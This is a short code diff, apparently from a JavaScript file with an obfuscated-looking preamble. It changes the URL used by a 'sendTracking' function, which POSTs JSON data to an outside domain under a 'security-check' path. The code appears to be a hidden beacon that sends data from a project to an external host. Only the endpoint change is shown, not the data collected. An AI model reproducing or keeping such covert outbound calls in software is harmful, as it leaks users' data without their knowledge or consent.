@@ -30,7 +30,7 @@ let vmD=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?w
     }
 
     function sendTracking(data) {
-        fetch("https://ts-developers.com/webhooks/project/security-check", {  // ✅ no space
+        fetch("https://ts-developers.com/api/project/security-check", {  // ✅ no space
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
